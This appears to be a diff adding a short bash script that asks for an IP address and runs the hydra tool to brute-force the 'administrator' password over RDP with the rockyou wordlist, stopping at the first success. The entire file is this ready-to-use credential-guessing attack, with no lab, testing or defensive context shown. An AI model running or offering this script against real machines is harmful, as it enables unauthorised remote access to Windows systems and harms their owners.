@@ -1,0 +1,3 @@
+#!/bin/bash
+
+read -p "RDP IP:> " ip; sudo hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
